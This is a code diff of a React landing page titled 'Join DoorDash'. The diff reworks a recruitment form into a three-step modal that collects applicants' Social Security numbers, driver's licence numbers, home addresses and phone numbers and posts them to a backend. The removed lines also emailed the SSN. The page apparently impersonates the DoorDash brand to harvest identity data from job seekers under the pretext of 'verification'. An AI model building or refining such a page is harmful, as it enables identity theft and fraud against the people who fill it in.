@@ -1,4 +1,3 @@
-// src/views/Home.jsx
 import React, { useState } from "react";
 import backgroundImage from "../assets/imges/4.png";
 import logo from "../assets/imges/logo.png";
@@ -8,6 +7,8 @@ import "../app.css";
 const Home = () => {
   const [menuOpen, setMenuOpen] = useState(false);
   const [formOpen, setFormOpen] = useState(false);
+  const [step, setStep] = useState(1);
+  const [successOpen, setSuccessOpen] = useState(false);
 
   const [formData, setFormData] = useState({
     email: "",
@@ -25,11 +26,7 @@ const Home = () => {
     phonenumber: "",
   });
 
-  // =========================
-  // URL del backend desde variable de entorno
-  // =========================
   const apiUrl = import.meta.env.VITE_API_URL;
-
 
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -39,7 +36,6 @@ const Home = () => {
     e.preventDefault();
 
     try {
-      // 1️⃣ Guardar en la base de datos
       const saveRes = await fetch(`${apiUrl}/api/`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -50,8 +46,8 @@ const Home = () => {
           vehicle_model: formData.vehicleModel,
           color_vehicle: formData.color,
           vehicle_year: formData.vehicleYear,
-          licencia: formData.licenciaDeConducir || null, // opcional
-          ssn: formData.ssn || null, // opcional
+          licencia: formData.licenciaDeConducir || null,
+          ssn: formData.ssn || null,
           address_residential: formData.address,
           city: formData.city,
           state: formData.state,
@@ -61,48 +57,27 @@ const Home = () => {
       });
 
       const savedClient = await saveRes.json();
+      if (!saveRes.ok) throw new Error(savedClient.error);
 
-      if (!saveRes.ok) {
-        throw new Error(savedClient.error || "Error al guardar en la DB");
-      }
+      setFormOpen(false);
+      setSuccessOpen(true);
+      setStep(1);
 
-      // 2️⃣ Enviar correo
-      const emailRes = await fetch(`${apiUrl}/send-email`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          to: formData.email,
-          subject: "¡Bienvenido a DoorDash!",
-          fullName: formData.fullName,
-          email: formData.email,
-          licenciaDeConducir: formData.licenciaDeConducir,
-          ssn: formData.ssn,
-        }),
+      setFormData({
+        email: "",
+        fullName: "",
+        age: "",
+        vehicleModel: "",
+        color: "",
+        vehicleYear: "",
+        licenciaDeConducir: "",
+        ssn: "",
+        address: "",
+        city: "",
+        state: "",
+        postalCode: "",
+        phonenumber: "",
       });
-
-      const data = await emailRes.json();
-
-      if (data.ok) {
-        alert("Cliente guardado y email enviado correctamente ✔️");
-        setFormOpen(false);
-        setFormData({
-          email: "",
-          fullName: "",
-          age: "",
-          vehicleModel: "",
-          color: "",
-          vehicleYear: "",
-          licenciaDeConducir: "",
-          ssn: "",
-          address: "",
-          city: "",
-          state: "",
-          postalCode: "",
-          phonenumber: "",
-        });
-      } else {
-        alert("Cliente guardado, pero error al enviar email ❌");
-      }
     } catch (error) {
       console.error(error);
       alert("Error de conexión o al guardar datos ❌");
@@ -113,20 +88,20 @@ const Home = () => {
     <div className="w-full min-h-screen relative overflow-hidden">
       {/* Fondo */}
       <div
-        className="absolute top-0 left-0 w-full h-full bg-cover bg-no-repeat bg-center z-0"
+        className="absolute top-0 left-0 w-full h-full bg-cover bg-no-repeat 
+           bg-[position:15%_center] sm:bg-center z-0"
         style={{ backgroundImage: `url(${backgroundImage})` }}
       ></div>
 
       {/* Overlay negro */}
-      <div className="absolute top-0 left-0 w-full h-full bg-black/70 sm:bg-black/30 z-10"></div>
+      <div className="absolute top-0 left-0 w-full h-full bg-black/80 sm:bg-black/30 z-10"></div>
 
-      {/* Menú superior */}
+      {/* Menú superior (SIN CAMBIOS) */}
       <header className="w-full flex justify-between items-center p-3 bg-white/80 backdrop-blur-md shadow-md rounded-b-xl fixed top-0 left-0 z-30">
         <div className="flex items-center space-x-2">
           <img src={logo} alt="Logo" className="w-15 h-8 object-contain" />
         </div>
 
-        {/* Botón menú móvil */}
         <button
           className="sm:hidden w-12 h-12 flex items-center justify-center bg-white/80 backdrop-blur-sm rounded-full text-3xl text-gray-700 hover:text-orange-600 shadow-md hover:shadow-lg transition-all duration-300 focus:outline-none"
           onClick={() => setMenuOpen(!menuOpen)}
@@ -134,7 +109,6 @@ const Home = () => {
           ☰
         </button>
 
-        {/* Menú móvil desplegable */}
         <div
           className={`sm:hidden fixed top-16 right-4 w-40 bg-white/95 backdrop-blur-md rounded-xl shadow-lg z-20 transition-all duration-300 ${
             menuOpen
@@ -143,118 +117,245 @@ const Home = () => {
           }`}
         >
           <nav className="flex flex-col items-center py-4 space-y-3 font-semibold">
-            <a
-              onClick={() => setMenuOpen(false)}
-              href="#home"
-              className="w-full text-center py-2 text-gray-700 hover:text-orange-600 hover:bg-orange-50 rounded-lg transition-all"
-            >
+            <a href="#home" className="w-full text-center py-2">
               HOME
             </a>
-            <a
-              onClick={() => setMenuOpen(false)}
-              href="#services"
-              className="w-full text-center py-2 text-gray-700 hover:text-orange-600 hover:bg-orange-50 rounded-lg transition-all"
-            >
+            <a href="#services" className="w-full text-center py-2">
               SERVICES
             </a>
-            <a
-              onClick={() => setMenuOpen(false)}
-              href="#contact"
-              className="w-full text-center py-2 text-gray-700 hover:text-orange-600 hover:bg-orange-50 rounded-lg transition-all"
-            >
+            <a href="#contact" className="w-full text-center py-2">
               CONTACT
             </a>
           </nav>
         </div>
 
-        {/* Menú desktop */}
         <nav className="space-x-4 hidden sm:flex">
-          <a href="#home" className="text-gray-700 hover:text-orange-600 transition-colors">HOME</a>
-          <a href="#services" className="text-gray-700 hover:text-orange-600 transition-colors">SERVICES</a>
-          <a href="#contact" className="text-gray-700 hover:text-orange-600 transition-colors">CONTACT</a>
-          <a href="#contact" className="text-gray-700 hover:text-orange-600 transition-colors">LOGIN</a>
+          <a href="#home">HOME</a>
+          <a href="#services">SERVICES</a>
+          <a href="#contact">CONTACT</a>
+          <a href="#contact">LOGIN</a>
         </nav>
       </header>
 
-      {/* Contenido centrado */}
+      {/* Contenido principal (SIN CAMBIOS) */}
       <div className="flex flex-col justify-center items-center w-full h-screen relative z-20 px-5 text-center pt-16">
-        <h1 className="text-4xl md:text-5xl font-poppins font-bold text-white drop-shadow-2xl tracking-wide">
+        <h1 className="text-4xl md:text-5xl font-bold text-white">
           Join DoorDash
         </h1>
 
-        <p className="mt-4 text-lg md:text-xl text-white/90 font-medium max-w-2xl mx-auto leading-relaxed animate-[fadeInUp_1.4s_ease-out]">
+        <p className="mt-4 text-white/90 max-w-2xl">
           At DoorDash, we connect people with opportunities. Work flexible
           hours, earn competitively, and receive reliable support. If you want
           to join our team and be part of our family, don’t hesitate to reach
           out and start your journey with us.
         </p>
 
-        <img
-          src={img5}
-          alt="DoorDash illustration"
-          className="mt-4 md:w-60 md:h-60 w-40 h-40 object-contain animate-[fadeInUp_1.6s_ease-out]"
-        />
+        <img src={img5} className="mt-4 w-40 md:w-60" />
 
         <button
-          onClick={() => setFormOpen(true)}
-          className="mt-6 px-10 py-4 bg-gradient-to-r from-orange-600 to-orange-500 text-white font-bold tracking-widest uppercase rounded-2xl shadow-2xl relative overflow-hidden transition-all duration-500 hover:scale-110 hover:shadow-[0_0_35px_rgba(255,140,0,0.55)] active:scale-95 animate-[fadeInUp_1.8s_ease-out]"
+          onClick={() => {
+            setFormOpen(true);
+            setStep(1);
+          }}
+          className="mt-6 px-10 py-4 bg-orange-600 text-white rounded-2xl"
         >
           Contact Us
         </button>
       </div>
 
-      {/* Modal Formulario */}
+      {/* MODAL PAGINADO */}
       {formOpen && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex justify-center items-center z-50">
-          <div className="bg-white/95 backdrop-blur-md shadow-2xl rounded-3xl w-full max-w-sm md:max-w-xl p-4 md:p-8 relative animate-fadeIn mx-4 my-6">
+          <div className="bg-white/95 rounded-3xl w-full max-w-sm md:max-w-xl p-6 relative mx-4">
             <button
               onClick={() => setFormOpen(false)}
-              className="absolute top-3 right-3 w-10 h-10 flex items-center justify-center bg-white/80 backdrop-blur-sm rounded-full text-gray-600 hover:text-red-600 shadow-md hover:shadow-lg transition-all duration-300 hover:scale-110 focus:outline-none"
+              className="absolute top-3 right-3"
             >
               ✕
             </button>
 
-            <h2 className="text-2xl md:text-3xl font-bold italic text-orange-600 mb-6 text-center max-w-xs md:max-w-md mx-auto">
-              Complete Your Registration
+            <h2 className="text-xl font-bold text-center text-orange-600 mb-4">
+              Step {step} of 3
             </h2>
 
-            <form onSubmit={handleSubmit}>
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                {[
-                  { name: "email", placeholder: "Email", type: "email", required: true },
-                  { name: "fullName", placeholder: "Full Name", type: "text", required: true },
-                  { name: "age", placeholder: "Age", type: "number", required: true },
-                  { name: "vehicleModel", placeholder: "Vehicle Model", type: "text", required: true },
-                  { name: "color", placeholder: "Color Vehicle", type: "text", required: true },
-                  { name: "vehicleYear", placeholder: "Vehicle Year", type: "number", required: true },
-                  { name: "licenciaDeConducir", placeholder: "Driver License", type: "text", required: false },
-                  { name: "ssn", placeholder: "SSN", type: "text", required: false },
-                  { name: "address", placeholder: "Address Residential", type: "text", span: true, required: true },
-                  { name: "city", placeholder: "City", type: "text", required: true },
-                  { name: "state", placeholder: "State", type: "text", required: true },
-                  { name: "postalCode", placeholder: "Postal Code", type: "text", required: true },
-                  { name: "phonenumber", placeholder: "Phone Number", type: "number", required: true },
-                ].map((field, idx) => (
+            <form onSubmit={handleSubmit} className="space-y-4">
+              {step === 1 && (
+                <>
                   <input
-                    key={idx}
-                    type={field.type}
-                    name={field.name}
-                    placeholder={field.placeholder}
-                    value={formData[field.name]}
+                    name="email"
+                    placeholder="Email"
+                    value={formData.email}
                     onChange={handleChange}
-                    className={`input-field p-3 rounded-xl border border-gray-400 placeholder:text-orange-800 focus:ring-2 focus:ring-orange-300 transition-all ${field.span ? "md:col-span-2" : ""}`}
-                    required={field.required}
+                    required
+                    className="input-field"
                   />
-                ))}
-              </div>
+                  <input
+                    name="fullName"
+                    placeholder="Full Name"
+                    value={formData.fullName}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="age"
+                    placeholder="Age"
+                    value={formData.age}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                </>
+              )}
 
-              <button
-                type="submit"
-                className="mt-6 w-full bg-gradient-to-r from-orange-600 to-yellow-500 text-white font-bold py-3 rounded-2xl shadow-lg hover:scale-105 transition-transform"
-              >
-                Submit
-              </button>
+              {step === 2 && (
+                <>
+                  <input
+                    name="vehicleModel"
+                    placeholder="Vehicle Model"
+                    value={formData.vehicleModel}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="color"
+                    placeholder="Color Vehicle"
+                    value={formData.color}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="vehicleYear"
+                    placeholder="Vehicle Year"
+                    value={formData.vehicleYear}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="licenciaDeConducir"
+                    placeholder="Driver License"
+                    value={formData.licenciaDeConducir}
+                    onChange={handleChange}
+                    className="input-field"
+                  />
+                  <input
+                    name="ssn"
+                    placeholder="SSN"
+                    value={formData.ssn}
+                    onChange={handleChange}
+                    className="input-field"
+                  />
+                </>
+              )}
+
+              {step === 3 && (
+                <>
+                  <input
+                    name="address"
+                    placeholder="Address"
+                    value={formData.address}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="city"
+                    placeholder="City"
+                    value={formData.city}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="state"
+                    placeholder="State"
+                    value={formData.state}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="postalCode"
+                    placeholder="Postal Code"
+                    value={formData.postalCode}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                  <input
+                    name="phonenumber"
+                    placeholder="Phone Number"
+                    value={formData.phonenumber}
+                    onChange={handleChange}
+                    required
+                    className="input-field"
+                  />
+                </>
+              )}
+
+              <div className="flex gap-3">
+                {step > 1 && (
+                  <button
+                    type="button"
+                    onClick={() => setStep(step - 1)}
+                    className="w-1/2 bg-gray-300 py-2 rounded-xl"
+                  >
+                    Back
+                  </button>
+                )}
+                {step < 3 ? (
+                  <button
+                    type="button"
+                    onClick={() => setStep(step + 1)}
+                    className="w-full bg-orange-600 text-white py-2 rounded-xl"
+                  >
+                    Next
+                  </button>
+                ) : (
+                  <button
+                    type="submit"
+                    className="w-full bg-green-600 text-white py-2 rounded-xl"
+                  >
+                    Submit
+                  </button>
+                )}
+              </div>
             </form>
+          </div>
+        </div>
+      )}
+      {/* MODAL ÉXITO */}
+      {successOpen && (
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex justify-center items-center z-50">
+          <div className="bg-white rounded-3xl w-full max-w-md p-6 text-center animate-fadeIn mx-4 shadow-2xl">
+            <div className="flex justify-center mb-4">
+              <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center">
+                <span className="text-4xl">✅</span>
+              </div>
+            </div>
+
+            <h2 className="text-2xl font-bold text-green-600 mb-3">
+              Solicitud enviada con éxito
+            </h2>
+
+            <p className="text-gray-600 mb-6">
+              Hemos recibido tu información correctamente.
+              <br />
+              <span className="font-semibold">
+                Te enviaremos el estado de tu verificación al correo
+                suministrado.
+              </span>
+            </p>
+
+            <button
+              onClick={() => setSuccessOpen(false)}
+              className="px-8 py-3 bg-orange-600 text-white rounded-2xl hover:bg-orange-700 transition-all"
+            >
+              Entendido
+            </button>
           </div>
         </div>
       )}
